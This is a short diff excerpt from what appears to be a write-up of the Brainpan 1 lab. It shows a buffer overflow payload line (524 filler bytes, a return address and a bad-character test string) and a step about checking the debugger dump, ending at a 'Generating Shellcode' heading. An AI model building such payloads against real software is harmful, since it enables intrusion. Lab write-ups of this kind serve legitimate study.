@@ -176,7 +176,7 @@ b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\x
 payload = (b"A" * 524) + b"\xf3\x12\x17\x31" + chars + b'\r\n'
 ```
 
-After sending this new payload, we inspect the content in dump to look for any missing/truncated characters.
+After sending this new payload, we inspect the content in dump to look for any missing/truncated characters.  
 ![](/images/brainpan-1/22.jpg)
 
 ### Generating Shellcode
